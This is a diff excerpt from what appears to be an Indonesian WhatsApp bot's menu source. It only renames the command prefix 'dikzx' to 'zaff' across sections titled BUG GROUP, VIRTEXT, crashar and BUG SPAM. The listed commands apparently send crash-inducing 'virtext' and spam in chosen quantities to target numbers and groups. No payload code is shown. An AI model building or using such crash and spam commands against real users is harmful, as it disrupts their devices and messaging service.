-╠➤𝐝𝐢𝐤𝐳𝐱𝐬𝐚𝐧𝐭𝐞𝐭 𝟔𝟐𝟖𝐱𝐱𝐱@𝐬.𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩.𝐧𝐞𝐭|𝟏𝟎|𝟏𝟎𝐬
+╠➤𝐳𝐚𝐟𝐟𝐬𝐤𝐮𝐲 𝟔𝟐𝟖𝐱𝐱𝐱
+╠➤𝐳𝐚𝐟𝐟𝐬𝐚𝐧𝐭𝐞𝐭 𝟔𝟐𝟖𝐱𝐱𝐱@𝐬.𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩.𝐧𝐞𝐭|𝟏𝟎|𝟏𝟎𝐬
 ╠➤𝐜𝐚𝐭𝐚𝐥𝐨𝐠𝐩𝐜 𝟔𝟐𝟖𝐱𝐱𝐱@𝐬.𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩.𝐧𝐞𝐭|𝟏𝟎|𝟏𝟎𝐬
-╚════[ ꪶ⸸⁶⁶⁶𝐝𝐢𝐤𝐳𝐱⁶⁶⁶⸸ꫂ͢ ]══════⊱
+╚════[ ꪶ⸸⁶⁶⁶𝐳𝐚𝐟𝐟⁶⁶⁶⸸ꫂ͢ ]══════⊱
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 
 𝐊𝐞𝐭𝐢𝐤 > 𝐦.𝐜𝐡𝐚𝐭 ( 𝐝𝐢 𝐠𝐫𝐨𝐮𝐩 𝐝𝐮𝐥𝐮🌷)
 ╔══════[ 𝐁𝐔𝐆 𝐆𝐑𝐎𝐔𝐏 ]══════⊱
-╠➤𝐠𝐚𝐬𝐝𝐢𝐤𝐳𝐱 𝟏𝟏𝟐𝟔𝟕𝟒𝟒𝟒𝟖𝐱𝐱𝐱
-╠➤𝐝𝐢𝐤𝐳𝐱𝐬𝐚𝐧𝐭𝐞𝐭𝐠𝐜  𝟏𝟐𝟑𝟕𝟖𝟗𝟏𝐱𝐱𝐱𝐱@𝐠.𝐮𝐬|𝟏𝟎|𝟏𝟎𝐬
+╠➤𝐠𝐚𝐬𝐳𝐚𝐟𝐟 𝟏𝟏𝟐𝟔𝟕𝟒𝟒𝟒𝟖𝐱𝐱𝐱
+╠➤𝐳𝐚𝐟𝐟𝐬𝐚𝐧𝐭𝐞𝐭𝐠𝐜  𝟏𝟐𝟑𝟕𝟖𝟗𝟏𝐱𝐱𝐱𝐱@𝐠.𝐮𝐬|𝟏𝟎|𝟏𝟎𝐬
 ╠➤𝐜𝐚𝐭𝐚𝐥𝐨𝐠𝐠𝐜 𝟏𝟐𝟑𝟕𝟖𝟗𝟏𝐱𝐱𝐱𝐱@𝐠.𝐮𝐬|𝟏𝟎|𝟏𝟎𝐬
-╚════[ ꪶ⸸⁶⁶⁶𝐝𝐢𝐤𝐳𝐱⁶⁶⁶⸸ꫂ͢ ]══════⊱
+╚════[ ꪶ⸸⁶⁶⁶𝐳𝐚𝐟𝐟⁶⁶⁶⸸ꫂ͢ ]══════⊱
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 
 ╔══════[ 𝐕𝐈𝐑𝐓𝐄𝐗𝐓 ]══════⊱
-╠➤𝐝𝐢𝐤𝐳𝐱𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟏𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟏𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐜𝐫𝐚𝐬𝐡𝐚𝐫𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐜𝐫𝐚𝐬𝐡𝐚𝐫𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐜𝐫𝐚𝐬𝐡𝐚𝐫𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
@@ -4817,7 +4817,7 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `© Hay Kak ${pushname} �
 ╠➤𝐜𝐫𝐚𝐬𝐡𝐚𝐫𝟏𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐜𝐫𝐚𝐬𝐡𝐚𝐫𝟏𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐜𝐫𝐚𝐬𝐡𝐚𝐫𝟐𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╚════[ ꪶ⸸⁶⁶⁶𝐝𝐢𝐤𝐳𝐱⁶⁶⁶⸸ꫂ͢ ]══════⊱
+╚════[ ꪶ⸸⁶⁶⁶𝐳𝐚𝐟𝐟⁶⁶⁶⸸ꫂ͢ ]══════⊱
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 
 ╔══════[ 𝐁𝐔𝐆 𝐒𝐏𝐀𝐌 ]══════⊱
@@ -4837,95 +4837,95 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `© Hay Kak ${pushname} �
 ╠➤𝐲𝐞𝐞𝐭 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐛𝐢𝐭𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐥𝐢𝐜𝐤 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐤𝐚𝐧𝐠𝐛𝐮𝐭𝐭𝐭𝐨𝐧 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐝𝐞𝐥𝐚𝐲 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐬𝐭𝐢𝐤 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐛𝐮𝐠𝐢𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐤𝐚𝐧𝐠𝐛𝐮𝐭𝐭𝐭𝐨𝐧 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐝𝐞𝐥𝐚𝐲 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐬𝐭𝐢𝐤 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐛𝐮𝐠𝐢𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐛𝐮𝐠𝐥𝐨𝐤𝐚𝐬 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐭𝐨𝐝 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐛𝐨𝐤𝐞𝐩 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐭𝐨𝐝 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐛𝐨𝐤𝐞𝐩 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐛𝐮𝐠𝐢𝐧𝐯𝐢𝐭𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ] 𝐏𝐜
-╠➤𝐝𝐢𝐤𝐳𝐱𝐡𝐚 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐡𝐢 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐝𝐢𝐤𝐳𝐱𝐡𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐡𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐛𝐚 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐛𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐛𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐛𝐢 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐜𝐚 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐜𝐢 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐜𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐜𝐨 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐛𝐮𝐠𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐛𝐮𝐠𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐛𝐮𝐠𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐛𝐮𝐠𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐛𝐮𝐠𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐛𝐮𝐠𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐛𝐮𝐠𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐩𝐨𝐥𝐥 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐭𝐚𝐠 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐡𝐚 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐡𝐢 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐳𝐚𝐟𝐟𝐡𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐡𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐛𝐚 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐛𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐛𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐛𝐢 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐜𝐚 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐜𝐢 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐜𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐜𝐨 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐛𝐮𝐠𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐛𝐮𝐠𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐛𝐮𝐠𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐛𝐮𝐠𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐛𝐮𝐠𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐛𝐮𝐠𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐛𝐮𝐠𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐩𝐨𝐥𝐥 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐭𝐚𝐠 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐢𝐧𝐢𝐛𝐮𝐠 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐡𝐢𝐲𝐚 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐥𝐨𝐤𝐚𝐬 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐜𝐚𝐭𝐚𝐥𝐨𝐠 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐝𝐨𝐜𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐝𝐚𝐜𝐚 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐝𝐨𝐜𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐝𝐚𝐜𝐚 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐝𝐮𝐜 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐝𝐮𝐜𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐭𝐫𝐨𝐥𝐢 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐭𝐫𝐨𝐥𝐢𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐭𝐫𝐨𝐥𝐢𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐣𝐡𝐨𝐧𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐣𝐡𝐨𝐧 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐛𝐮𝐭𝐭𝐨𝐧 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐭𝐫𝐨𝐥 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐤𝐚𝐭𝐚𝐥𝐨𝐠 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐝𝐮𝐜𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐝𝐚𝐜𝐚 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐝𝐫𝐚𝐤𝐧𝐞𝐬
-╠➤𝐝𝐢𝐤𝐳𝐱𝐬𝐥𝐞𝐛𝐞𝐰 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐬𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐭𝐨𝐥 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐦𝐞𝐦𝐞𝐤 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐜𝐨𝐧𝐭𝐨𝐥 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐭𝐞𝐱𝐭𝐯 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐠𝐚𝐬 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐣𝐮𝐯𝐢𝐫𝐭𝐞𝐱𝐭 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐣𝐮𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐣𝐮𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐣𝐮𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐜𝐫𝐚𝐬𝐡 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐜𝐫𝐚𝐬𝐡𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐜𝐫𝐚𝐬𝐡𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐜𝐫𝐚𝐬𝐡𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐜𝐫𝐚𝐬𝐡𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐜𝐫𝐚𝐬𝐡𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐜𝐫𝐚𝐬𝐡𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐜𝐫𝐚𝐬𝐡𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐥𝐨𝐤𝐚𝐬 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐥𝐨𝐤𝐚𝐬𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐤𝐚𝐧𝐠𝐛𝐮𝐠 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐤𝐚𝐧𝐠𝐛𝐮𝐠𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐛𝐚𝐫 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐨𝐤𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐞𝐰𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝐧𝐠𝐞𝐧𝐭𝐨𝐝 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟏𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟏𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐝𝐢𝐤𝐳𝐱𝟏𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐭𝐫𝐨𝐥𝐢 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐭𝐫𝐨𝐥𝐢𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐭𝐫𝐨𝐥𝐢𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐣𝐡𝐨𝐧𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐣𝐡𝐨𝐧 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐛𝐮𝐭𝐭𝐨𝐧 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐭𝐫𝐨𝐥 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐤𝐚𝐭𝐚𝐥𝐨𝐠 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐝𝐮𝐜𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐝𝐚𝐜𝐚 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐝𝐫𝐚𝐤𝐧𝐞𝐬
+╠➤𝐳𝐚𝐟𝐟𝐬𝐥𝐞𝐛𝐞𝐰 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐬𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐭𝐨𝐥 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐦𝐞𝐦𝐞𝐤 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐜𝐨𝐧𝐭𝐨𝐥 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐭𝐞𝐱𝐭𝐯 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐠𝐚𝐬 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐣𝐮𝐯𝐢𝐫𝐭𝐞𝐱𝐭 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐣𝐮𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐣𝐮𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐣𝐮𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐜𝐫𝐚𝐬𝐡 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐜𝐫𝐚𝐬𝐡𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐜𝐫𝐚𝐬𝐡𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐜𝐫𝐚𝐬𝐡𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐜𝐫𝐚𝐬𝐡𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐜𝐫𝐚𝐬𝐡𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐜𝐫𝐚𝐬𝐡𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐜𝐫𝐚𝐬𝐡𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐥𝐨𝐤𝐚𝐬 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐥𝐨𝐤𝐚𝐬𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
